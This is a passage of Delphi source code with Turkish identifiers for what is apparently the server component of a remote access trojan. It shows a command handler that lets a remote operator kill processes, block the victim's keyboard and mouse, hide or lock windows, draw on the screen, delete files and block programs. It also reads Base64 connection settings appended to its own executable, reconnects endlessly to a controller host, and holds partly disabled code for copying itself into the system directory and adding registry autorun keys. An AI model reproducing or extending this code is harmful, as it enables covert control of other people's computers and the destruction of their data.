    delete(komut, 1,5);
    parametre[0]:=parcala(komut,0);
    TThread2.Create(@konsolcikisi, 0);
    goto son;
    end;

    if copy (komut, 1, 8) = '/INTIHAR' then begin
    Socket.Sendstring(decode64(str2)+'35|.');
    KillProcess(extractfilename(Paramstr(0)));
    goto son;
    end;

    if copy (komut, 1, 5) = '/BKES' then begin
    Socket.Sendstring(decode64(str2)+'36|.');
    socket.Disconnect;
    goto son;
    end;

    if copy (komut, 1, 9) = '/FATALITY' then begin
    Socket.Sendstring(decode64(str2)+'66='+makine+'/'+kullanici+'|.');
    //fatality;
    end;

    if copy (komut, 1, 7)='/PKAPAT' then begin
    delete(komut, 1, 8);
    if KillApp(pchar(parcala(komut,0))) = true then socket.SendString(decode64(str2)+'37='+parcala(komut,0)+'|.')
    else
    socket.SendString(decode64(str2)+'38='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 7)='/EKAPLA' then begin
    delete(komut, 1, 8);
    if ekranikapla(pchar(parcala(komut,0))) = true then socket.SendString(decode64(str2)+'39='+parcala(komut,0)+'|.')
    else
    socket.SendString(decode64(str2)+'40='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 7)='/PFLASH' then begin
    delete(komut, 1, 8);
    komut:=parcala(komut,0);
    if flash(pchar(parcala(komut,0))) then socket.SendString(decode64(str2)+'39='+parcala(komut,0)+'|.')
    else
    socket.SendString(decode64(str2)+'40='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 7)='/BDEGIS' then begin
    delete(komut, 1, 8);
    if bdegis(pchar(parcala(komut,0)),pchar(parcala(komut,1))) then socket.sendstring(decode64(str2)+'39='+parcala(komut,1)+'|.')
    else
    socket.SendString(decode64(str2)+'40='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 7)='/PGETIR' then begin
    delete(komut, 1, 8);
    komut:=parcala(komut,0);
    if AppActivate(pchar(komut)) = true then socket.SendString(decode64(str2)+'39='+komut+'|.')
    else
    socket.SendString(decode64(str2)+'40='+komut+'|.');
    goto son;
    end;

    if copy (komut, 1, 7)='/PSAKLA' then begin
    delete(komut, 1, 8);
    komut:=parcala(komut,0);
    if Psakla(pchar(komut),false) = true then socket.SendString(decode64(str2)+'39='+komut+'|.')
    else
    socket.SendString(decode64(str2)+'40='+komut+'|.');
    goto son;
    end;

    if copy (komut, 1, 3)='/PK' then begin
    delete(komut, 1, 4);
    komut:=parcala(komut,0);
    if pkilitle(pchar(komut)) = true then socket.SendString(decode64(str2)+'39='+komut+'|.')
    else
    socket.SendString(decode64(str2)+'40='+komut+'|.');
    goto son;
    end;

    if copy (komut, 1, 3)='/KC' then begin
    delete(komut, 1, 4);
    komut:=parcala(komut,0);
    if pkilitac(pchar(komut)) = true then socket.SendString(decode64(str2)+'39='+komut+'|.')
    else
    socket.SendString(decode64(str2)+'40='+komut+'|.');
    goto son;
    end;

    if copy (komut, 1, 7)='/PGSTER' then begin
    delete(komut, 1, 8);
    komut:=parcala(komut,0);
    if Psakla(pchar(komut),true) = true then socket.SendString(decode64(str2)+'39='+komut+'|.')
    else
    socket.SendString(decode64(str2)+'40='+komut+'|.');
    goto son;
    end;

    if copy (komut, 1, 6) = '/AKLIT' then begin
    enablewindow(getforegroundwindow,false);
    Socket.Sendstring(decode64(str2)+'41='+aktifpencere+'|.');
    goto son;
    end;

    if copy (komut, 1, 4) = '/AAC' then begin
    enablewindow(getforegroundwindow,true);
    Socket.Sendstring(decode64(str2)+'42='+aktifpencere+'|.');
    goto son;
    end;

    if copy (komut, 1, 8) = '/KILITLE' then begin
    BlockInput(true);
    Socket.Sendstring(decode64(str2)+'43|.');
    goto son;
    end;

    if copy (komut, 1, 8) = '/KILITAC' then begin
    BlockInput(false);
    Socket.Sendstring(decode64(str2)+'44|.');
    goto son;
    end;

    if copy (komut, 1, 6)='/ESICH' then begin
    delete(komut, 1, 7);
    try
    PrintInCoordinate(parcala(komut,0), strtoint(parcala(komut,1)),strtoint(parcala(komut,2)),strtoint(parcala(komut,3)),strtoint(parcala(komut,4)),strtoint(parcala(komut,5)),parcala(komut,6));
    except
    on Exception do hata('+uyari04');
    end;
    Socket.sendstring(decode64(str2)+'45='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 6)='/EASIL' then begin
    delete(komut, 1, 7);
    if aktif[1] then begin
    Socket.sendstring('+uyari05');
    goto son;
    end;
    ekranayaz(parcala(komut,0), strtoint(parcala(komut,1)),strtoint(parcala(komut,2)),strtoint(parcala(komut,3)),strtoint(parcala(komut,4)),strtoint(parcala(komut,5)),parcala(komut,6));
    Socket.sendstring(decode64(str2)+'46='+parcala(komut,0)+'|.');
    aktif[1]:=true;
    goto son;
    end;

    if copy (komut, 1, 9) = '/ETEMIZLE' then begin
    Socket.sendstring(decode64(str2)+'47|.');
    ekrantemizle;
    aktif[1]:=false;
    goto son;
    end;

    if copy (komut, 1, 6)='/INDIR' then begin
    delete(komut, 1, 7);
    try
    parametre[1]:=parcala(komut,0);
    parametre[2]:=parcala(komut,1);
    except
    on exception DO HATA('+uyari06');
    end;
  //  TThread2.Create(@dindir, 0);
    goto son;
    end;

    if copy (komut, 1, 5)='/SMSG' then begin
    delete(komut, 1, 6);
    mk[3]:=parcala(komut,0);
    mk[4]:=parcala(komut,1);
    mk[0]:=parcala(komut,2);
    mk[1]:=parcala(komut,3);
    TThread2.Create(@SMSG, 0);
    goto son;
    end;

    if copy (komut, 1, 10)='/YENILABEL' then begin
    delete(komut, 1, 11);
    if labeldegis(parcala(komut,0),parcala(komut,1)) then socket.SendString(decode64(str2)+'48='+parcala(komut,0)+' - '+parcala(komut,1)+'|.')
    else socket.SendString(decode64(str2)+'49='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 5)='/FARE' then begin
    delete(komut, 1, 6);
    komut:=parcala(komut,0);
    if komut='KAPA' then begin
    if aktif[0] then begin
    Socket.Sendstring('+uyari07');
    goto son;
    end;
    faredondur;
    aktif[0]:=True;
    Socket.Sendstring(decode64(str2)+'50|.');
    end;
    if komut='AC' then begin
    fareac;
    aktif[0]:=false;
    Socket.Sendstring(decode64(str2)+'51|.');
    end;
    goto son;
    end;

    if copy (komut, 1, 7)='/PENGEL' then begin
    delete(komut, 1, 8);

    if parcala(komut,0)='AC' then begin
    if aktif[2] then begin
    Socket.Sendstring(decode64(str2)+'52|.');
    goto son;
    end;
    programengel(parcala(komut,1));
    aktif[2]:=True;
    Socket.Sendstring(decode64(str2)+'53='+parcala(komut,1)+'|.');
    goto son;
    end;

    if parcala(komut,0)='KAPA' then begin
    prgiptal;
    aktif[2]:=false;
    Socket.Sendstring(decode64(str2)+'54|.');
    end;
    goto son;
    end;

    if copy (komut, 1, 7)='/PUYARI' then begin
    delete(komut,1,8);
    komut:=parcala(komut,0);
    if komut = 'AC' then begin
    if aktif[6] then begin
    socket.SendString(decode64(str2)+'55|.');
    goto son;
    end;
    tayymir[0]:=settimer(0,tayymir[0],100,@baslikyolla);
    aktif[6]:=true;
    goto son;
    end;

    if komut = 'KAPA' then begin
    killtimer(0,tayymir[0]);
    socket.SendString(decode64(str2)+'11|.');
    aktif[6]:=false;
    end;
    GOTO SON;
    end;

    if copy (komut, 1, 9) = '/IDLEUYAR' then begin
    if aktif[7] then goto son;
    socket.SendString(decode64(str2)+'67|.');
    tayymir[1]:=settimer(0,tayymir[1],100,@idlekontrol);
    aktif[7]:=true;
    goto son;
    end;

    if copy (komut, 1, 5) = '/HSIL' then begin
    delete(komut,1,6);
    silinesi:=parcala(komut,0);
    TThread2.Create(@katliam, 0);
    goto son;
    end;

    if copy (komut, 1, 5)='/CROM' then begin
    delete(komut,1,6);
    if parcala(komut,0) = 'AC' then begin
    mciSendString(pchar(decode64(cdacstr)), nil, 0, 0);
    Socket.Sendstring(decode64(str2)+'56|.');
    end;
    if parcala(komut,0) = 'KAPA' then begin
    mciSendString(pchar(decode64(cdkapastr)), nil, 0, 0);
    Socket.Sendstring(decode64(str2)+'57|.');
    end;
    goto son;
    end;

    //komutlar son!

//client - server ili$kisi

if copy (komut, 1, 8) = '+sonraki' then begin
aktif[3]:=true;
goto son;
end;

if copy (komut, 1, 6) = '+iptal' then begin
aktif[4]:=true;
goto son;
end;

if copy (komut, 1, 7) = '+kensil' then begin
aktif[10]:=true;
goto son;
end;

if copy (komut, 1, 3) = '+YN' then begin
delete(komut,1,3);
komut:=parcala(komut,0);
Socket.Sendstring('+YNL'+komut+'|'+makine+'/'+kullanici+'|'+inttostr(port)+'|.');
goto son;
end;

if copy (komut, 1, 3) = '+RL' then begin
Socket.Sendstring('+ID'+'|'+makine+'|'+kullanici+'|'+extractfilename(Paramstr(0))+'|.');
goto son;
end;

if copy (komut, 1, 5)='+ping' then begin
delete(komut, 1, 5);
Socket.Sendstring('+cvp'+komut+'|.');
goto son;
end;

if copy (komut, 1, 5) = '+idle' then begin
Socket.Sendstring('+UI'+inttostr(idle)+'|.');
goto son;
end;

Socket.Sendstring(decode64(str2)+'59='+komut+'|.');
SON:
end;

sleep(1);
Applikeysin.ProcessMessages;
end;

Socket.Disconnect;
Socket.Free;
end;

procedure kurbeni(Yol:String);
var
anahtar:HKEY;
label KUR;
begin
exit;
if ParamStr(0) = sysdizini+'\'+tashakli_isim then goto KUR;
CopyFile(PChar(Paramstr(0)),PChar(Yol),False);
KUR:
//RegOpenKey(HKEY_LOCAL_MACHINE,pchar(decode64(kurstr)),anahtar);
//RegSetValueEx(anahtar,pchar(anahtaradi),0,1,PChar(Yol),lstrlen(PChar(Yol))+1);
//RegCloseKey(anahtar);
end;
{
procedure fakbeni(Yol:String);
label KUR;
begin
if ParamStr(0) = sysdizini+'\'+tashakli_isim then goto KUR;
CopyFile(PChar(Paramstr(0)),PChar(Yol),False);
KUR:
rgyaz(HKEY_LOCAL_MACHINE, decode64(kurstr2)+guid,decode64(kurstr5),yol+' -i');
RegDeleteKey(HKEY_current_user,pchar(decode64(kurstr2)+guid));
end;

procedure samca(dizin : string);
label KUR;
begin
if ParamStr(0) = sysdizini+'\'+dizin+'\'+tashakli_isim then goto KUR;
createdirectory(pchar(sysdizini+'\'+dizin),nil);
copyfile(pchar(paramstr(0)),pchar(sysdizini+'\'+dizin+'\'+tashakli_isim),false);
kur:
rgyaz(HKEY_LOCAL_MACHINE,decode64(kurstr3),decode64(kurstr4),sysdizini+'\'+dizin);
end;
 }
procedure Anabaglanti(Thread: TThread2);
begin
  while 0 < 1 do begin
  Anasoket := TClientSocket.Create;
    Anasoket.Connect(adres, port);
    if Anasoket.Connected then PsyCore(Thread, Anasoket);
    sleep(baglantisure);
  end;
end;

procedure ayarlarioku;
VAR
 fcontent, apnd : string;
 i,j : integer;
begin
  maxpaket:=1250;
  maxsikistirma:=10;
  zamanasimi:=150;
  baglantisure:=3000;
 copyfile( PChar(paramstr(0)) , PChar(paramstr(0)+'_'), false );
 LoadServer( paramstr(0)+'_' , fcontent );
 apnd := '';
 i := length( fcontent );
 while (i>0) AND (fcontent[i]<>#00) do begin
  apnd := fcontent[i] + apnd;
  i := i-1;
end;

if apnd='' then begin
deletefile( PChar(paramstr(0)+'_') );
halt;
end;

for j:=0 to 13 do begin
ayar[j]:='-';
end;

ayarstr1:='-';
ayarstr2:='-';
ayarstr3:='-';

apnd:=decode64(apnd);
for j:=0 to 13 do begin
ayar[j]:=parcala(apnd,j);
end;
deletefile( PChar(paramstr(0)+'_') );
end;

begin
  ayarlarioku;
  Tashakli_isim:=ayar[0];
  MuteXxX:=ayar[2];
  if ParamStr(0) = sysdizini+'\'+tashakli_isim then begin
  if paramstr(1) = '-i' then begin
  RunProcess(PChar(paramstr(0)), 0);
  halt;
  end;
  end;
  achiliskontrol;
  Applikeysin := TApplication.Create;
  try
  maxpaket:=strtoint(ayar[10]);
  maxsikistirma:=strtoint(ayar[11]);
  zamanasimi:=strtoint(ayar[12]);
  baglantisure:=strtoint(ayar[13]);
  anahtaradi:=ayar[1];
  adres:=ayar[3];
  port:=strtoint(ayar[4]);
  sifre:=ayar[5];
  guid:=ayar[6];
  if ayar[7]='X' then begin
  kurbeni(sysdizini+'\'+tashakli_isim);
  ayarstr1:='X';
  end;
  if ayar[8]='X' then begin
 // fakbeni(sysdizini+'\'+tashakli_isim);
  ayarstr2:='X';
  end;
  if ayar[9]='X' then begin
//  samca(anahtaradi);
  ayarstr3:='X';
  end;
  sleep(200);
  crchedesi:=inttostr(computefilecrc32(paramstr(0)));
  if baglantisure=0 then baglantisure:=1000;
  baglantisifre:=decode64(sifre);
  except on exception do exit;
  end;
  TThread2.Create(@Anabaglanti, 0);
  sleep(200);
  while 0 < 1 do begin
    sleep(1);
  Applikeysin.ProcessMessages;
  end;
end.
